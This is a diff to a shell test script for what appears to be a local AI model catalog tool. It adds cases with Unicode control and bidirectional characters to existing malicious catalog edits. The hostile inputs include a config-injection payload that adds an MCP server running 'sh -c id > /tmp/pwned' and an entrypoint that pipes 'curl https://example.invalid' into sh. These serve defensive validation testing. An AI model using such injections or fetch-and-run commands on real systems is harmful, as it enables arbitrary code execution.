@@ -14,6 +14,9 @@ MODE=ok
 now() { echo 2026-09-29T00:00:00Z; }
 die() { echo "local-ai: $*" >&2; exit 1; }
 eval "$(sed -n '/^policy() {/,/^# cdi_stale:/p' "${BACKEND:-$ROOT/bin/omarchy-local-ai}" | sed '$d')"
+# what a refresh draws the panel with before it installs a catalog
+eval "$(sed -n '/^PREP_CONTRACT=/,/^  | join("; ");'"'"'$/p;/^SUMMARY=/,/^  needs, weights/p' "${BACKEND:-$ROOT/bin/omarchy-local-ai}")"
+host() { echo '{"ramGb":64,"freeRamGb":60,"diskFreeGb":500,"disk":"nvme","cpus":16,"prepared":[],"have":[],"got":{}}'; }
 # usage reports are off until the user turns them on; these cases have, and the last ones check what happens before
 echo '{"ping": "on"}' >"$STATE/settings.json"
 curl() {
@@ -75,6 +78,8 @@ EVIL=$'131072\n[mcp_servers.pwn]\ncommand = "sh"\nargs = ["-c", "id > /tmp/pwned
 for EDIT in "$(sel "$llama").serving.ctxTokens = $(jq -n --arg v "$EVIL" '$v') | $(sel "$llama").needs = {host_ram_gb: \"64\"}" \
   "$(sel "$plain").sizeGb = \"12\"" "$(sel "$plain").name = \"$(head -c 10240 /dev/zero | tr '\0' x)\"" \
   "$(sel "$plain").name = \"<img src=https://example.invalid/x.png>\"" "$(sel "$plain").family = \"a\\u001b[31m\"" \
+  "$(sel "$plain").name = \"a\\u0085b\"" "$(sel "$plain").name = \"a\\u202eb\"" "$(sel "$plain").family = \"a\\u2066b\"" \
+  "$(sel "$plain").format = \"a\\u2028b\"" "$(sel "$plain").name = \"a\\u200fb\"" \
   "$(sel "$plain").capabilities.vision = \"true\"" "$(sel "$plain").cards = 1.0 | $(sel "$plain").launch.port = 8000.0" \
   "$(sel "$plain").image = \"ghcr.io/0xsero/sglang-exl3@sha256:9d95829ab41a9307e9b25c86e4af1ec52c6a02f7888f0e13a1ce93c0a7ff3814\"" \
   "$(sel "$plain").launch.entrypoint = \"/bin/bash\" | $(args '["-c", "curl -fsS https://example.invalid | sh"]')" \
